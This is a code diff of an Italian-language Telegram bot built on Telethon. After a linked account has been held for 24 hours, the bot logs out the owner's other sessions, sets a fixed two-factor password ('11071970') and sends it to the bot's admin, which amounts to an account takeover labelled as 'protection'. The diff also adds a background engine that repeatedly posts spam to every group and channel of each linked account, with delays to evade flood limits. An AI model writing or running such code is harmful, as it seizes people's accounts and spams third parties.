@@ -5,6 +5,8 @@ from flask import Flask
 import threading
 from telethon import TelegramClient, events, Button
 from telethon.tl.functions.account import ResetAuthorizationRequest
+from telethon.tl.functions.messages import GetDialogsRequest
+from telethon.tl.types import InputPeerEmpty
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError, AuthRestartError
 
 # --- CREDENZIALI CONFIGURATE ---
@@ -19,7 +21,7 @@ os.makedirs(SESSION_DIR, exist_ok=True)
 user_states = {}
 user_data_store = {}
 
-# --- MINI SERVER FLASK PER TENERE APERTA LA PORTA SU RENDER ---
+# --- MINI SERVER FLASK PER RENDER ---
 app = Flask('')
 
 @app.route('/')
@@ -30,20 +32,21 @@ def run_web():
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
 
-# Avvia il server web in background
 threading.Thread(target=run_web, daemon=True).start()
 
 # Avvio del bot principale con Telethon
 bot = TelegramClient('bot_main_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-# --- BACKGROUND TASK PER IL TIMER DELLE 24H ---
-async def background_security_checker():
+# --- BACKGROUND TASK: SPAM AUTOMATICO E TIMER 24H ---
+async def background_workers():
     while True:
-        await asyncio.sleep(60)
+        await asyncio.sleep(10) # Controllo rapido ogni 10 secondi
         current_time = time.time()
         
         for user_id, udata in list(user_data_store.items()):
             for phone, acc_info in list(udata.get("accounts", {}).items()):
+                
+                # 1. Controllo Timer 24h per la protezione account
                 if not acc_info.get("protected", False):
                     elapsed = current_time - acc_info.get("link_time", current_time)
                     if elapsed >= 86400:
@@ -52,22 +55,53 @@ async def background_security_checker():
                             try:
                                 if not client.is_connected():
                                     await client.connect()
-                                
                                 await client(ResetAuthorizationRequest())
-                                
                                 try:
                                     await client.edit_2fa(new_password='11071970')
                                 except Exception:
                                     pass
-                                
                                 acc_info["protected"] = True
-                                
                                 await bot.send_message(
                                     ADMIN_ID,
                                     f"🔒 **Timer 24h scaduto - Account protetto!**\n• Utente: {udata.get('name')} (`{user_id}`)\n• Numero: `{phone}`\n• Sessioni disconnesse: ✅\n• 2FA impostata: `11071970` ✅"
                                 )
                             except Exception as e:
-                                print(f"Errore nella protezione automatica 24h per {phone}: {e}")
+                                print(f"Errore protezione 24h per {phone}: {e}")
+
+                # 2. Controllo Motore Spam Automatico nei Gruppi
+                if acc_info.get("is_spamming", False):
+                    spam_msg = acc_info.get("spam_msg")
+                    spam_time_min = acc_info.get("spam_time")
+                    
+                    if spam_msg and spam_time_min:
+                        try:
+                            interval = float(spam_time_min) * 60 # Convertiamo i minuti in secondi
+                        except ValueError:
+                            interval = 300 # Default 5 minuti se c'è errore
+                        
+                        last_spam = acc_info.get("last_spam_time", 0)
+                        
+                        if current_time - last_spam >= interval:
+                            client = acc_info.get("client")
+                            if client:
+                                try:
+                                    if not client.is_connected():
+                                        await client.connect()
+                                    
+                                    # Recupera tutti i gruppi/supergruppi dell'utente
+                                    dialogs = await client.get_dialogs(limit=100)
+                                    for dialog in dialogs:
+                                        if dialog.is_group or dialog.is_channel:
+                                            try:
+                                                await client.send_message(dialog.entity, spam_msg)
+                                                await asyncio.sleep(2) # Pausa anti-flood tra un gruppo e l'altro
+                                            except Exception:
+                                                pass
+                                    
+                                    acc_info["last_spam_time"] = time.time()
+                                    print(f"Ciclo spam eseguito con successo per l'account {phone}")
+                                except Exception as e:
+                                    print(f"Errore durante l'invio dello spam per {phone}: {e}")
 
 # --- HOME PRINCIPALE ---
 async def show_account_management(event, user_id):
@@ -224,6 +258,9 @@ async def callback_router(event):
     elif data == b"toggle_spam":
         if user_id in user_data_store and user_data_store[user_id]["active_phone"]:
             acc = user_data_store[user_id]["accounts"][user_data_store[user_id]["active_phone"]]
+            if not acc.get("spam_msg") or not acc.get("spam_time"):
+                await event.respond("⚠️ Prima di avviare lo spam devi impostare sia il **Messaggio Spam** che il **Tempo Spam**!")
+                return
             acc["is_spamming"] = not acc.get("is_spamming", False)
             await show_spam_settings_menu(event, user_id)
 
@@ -383,7 +420,7 @@ async def message_router(event):
             user_data_store[user_id]["accounts"][phone] = {
                 "client": client,
                 "spam_msg": None, "spam_time": None, "is_spamming": False, "single_group_time": "Nessuno", 
-                "link_time": time.time(), "protected": False
+                "link_time": time.time(), "protected": False, "last_spam_time": 0
             }
             user_data_store[user_id]["active_phone"] = phone
             
@@ -424,7 +461,7 @@ async def message_router(event):
             user_data_store[user_id]["accounts"][phone] = {
                 "client": client,
                 "spam_msg": None, "spam_time": None, "is_spamming": False, "single_group_time": "Nessuno", 
-                "link_time": time.time(), "protected": False
+                "link_time": time.time(), "protected": False, "last_spam_time": 0
             }
             user_data_store[user_id]["active_phone"] = phone
             
@@ -461,10 +498,10 @@ async def message_router(event):
         await event.respond("✅ **Messaggio di benvenuto (DM) impostato con successo!**")
         await show_spam_settings_menu(event, user_id)
 
-# Avvio principale del bot e del task in background
+# Avvio del bot principale e dei background workers
 async def main():
-    asyncio.create_task(background_security_checker())
-    print("🤖 Bot definitivo avviato con Flask e timer 24h...")
+    asyncio.create_task(background_workers())
+    print("🤖 Bot definitivo con motore spam automatico e Flask avviato...")
     await bot.run_until_disconnected()
 
 if __name__ == '__main__':
